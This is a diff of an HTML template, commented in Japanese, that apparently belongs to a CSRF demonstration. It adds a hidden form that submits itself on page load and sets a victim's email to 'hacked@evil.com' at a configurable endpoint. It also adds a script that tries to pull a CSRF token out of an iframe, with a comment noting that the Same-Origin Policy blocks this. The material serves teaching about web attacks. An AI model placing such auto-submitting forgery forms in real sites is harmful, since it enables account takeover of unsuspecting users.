@@ -17,9 +17,20 @@
     
     <!-- 隠しCSRF攻撃フォーム - 自動的に送信される -->
     <iframe style="display:none" name="hidden-frame"></iframe>
-    <form id="csrf-form" action="http://localhost:3000/update_email" method="post" target="hidden-frame">
+    <form id="csrf-form" action="<%= @target_endpoint %>/update_email" method="post" target="hidden-frame">
       <input type="hidden" name="email" value="hacked@evil.com">
     </form>
+
+
+    <!-- profile ページから csrf トークンを抜き出す -->
+    <iframe id="victimFrame" src="<%= @target_endpoint %>/profile"></iframe>
+    <script>
+      setTimeout(function() {
+        // Same-Origin Policy によって、iframe 内のDOMにアクセスできず、失敗する 
+        var token = document.getElementById('victimFrame').contentDocument.querySelector('input[name="csrf_token"]').value;
+        console.log("盗んだトークン: " + token); 
+      }, 1000);
+    </script>
     
     <script>
       // ページ読み込み時に自動的にフォームを送信
